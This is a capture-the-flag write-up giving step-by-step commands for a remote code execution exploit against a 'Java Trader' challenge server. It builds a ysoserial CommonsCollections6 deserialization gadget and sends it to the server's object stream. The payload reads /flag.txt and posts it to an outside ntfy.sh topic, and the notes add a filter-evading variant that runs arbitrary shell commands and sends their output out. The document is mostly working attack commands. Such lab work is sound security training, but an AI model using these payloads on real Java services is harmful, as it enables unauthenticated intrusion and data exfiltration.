# Java Trader Exploit – Reproducible Steps

These steps reproduce the remote code execution exploit used to retrieve the flag from the Java Trader challenge deployed at `team54-thickapp.durhack.qwerty.technology:9999`.

## Prerequisites

- JDK 11+ available on your path (`javac`, `java`).
- The provided client repository cloned locally.
- `ysoserial-all.jar` present in the project root (already included in this workspace).
- Network access to the challenge host.
- An ntfy topic you control for receiving exfiltrated data (these steps use `https://ntfy.sh/sglre6355`; replace with your own if desired).

## 1. Compile the Exploit Payload

The exploit builds a CommonsCollections6 gadget via ysoserial, embeds it into the `data` field of a `BuyRequest`, and sends it directly to the server’s Java object stream. The payload command exfiltrates `/flag.txt` with `curl`.

```bash
cd /home/sglre6355/durhack-x/ctf/java
javac --add-opens java.base/java.util=ALL-UNNAMED \
      -cp client:ysoserial-all.jar \
      -d build \
      client/sources/com/ctf/stockapp/client/ExploitPayload.java
```

## 2. Execute the Exploit

Run the compiled payload. The default command in `ExploitPayload` is already set to read `/flag.txt` and POST it to ntfy.

```bash
java --add-opens java.base/java.util=ALL-UNNAMED \
     -cp build:client:ysoserial-all.jar \
     com.ctf.stockapp.client.ExploitPayload
```

## 3. Retrieve the Flag

Poll the ntfy topic to capture the exfiltrated data. The response should include the challenge flag.

```bash
curl -s 'https://ntfy.sh/sglre6355/raw?poll=1'
```

Example output:

```
CTF{d3s3r14l1z4t10n_1s_d4ng3r0us}
```

## Notes

- If you need to run an alternative command on the server, pass it as the first argument to `ExploitPayload`. Example:
  ```bash
  java --add-opens java.base/java.util=ALL-UNNAMED \
       -cp build:client:ysoserial-all.jar \
       com.ctf.stockapp.client.ExploitPayload \
       'bash -c id|curl${IFS}-s${IFS}-d@-${IFS}https://ntfy.sh/your-topic'
  ```
- The `--add-opens` flag is required because ysoserial’s gadget accesses `java.util` internals blocked by default in newer JDKs.
- `ExploitPayload` connects directly without authentication; no prior login or GUI interaction is needed.
